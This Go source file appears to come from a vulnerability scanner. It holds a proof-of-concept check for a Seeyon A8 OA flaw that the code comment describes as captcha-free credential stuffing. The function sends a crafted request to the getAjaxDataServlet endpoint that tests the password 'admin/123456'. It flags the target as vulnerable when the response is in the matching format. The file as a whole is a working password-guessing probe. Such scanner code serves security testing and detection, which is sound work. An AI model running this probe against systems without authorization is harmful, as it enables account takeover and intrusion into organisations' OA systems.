package seeyon
import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//A8 GetAjaxDataServlet 无视验证码撞库

func GetAjaxDataServlet(u string) bool {
	if req, err := pkg.HttpRequset(u+"/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=123456", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "<V>") && strings.Contains(req.Body, "</V>") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon 无视验证码撞库|%s\n", u+"/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=123456"))
			
			return true
		}
	}
	return false
}
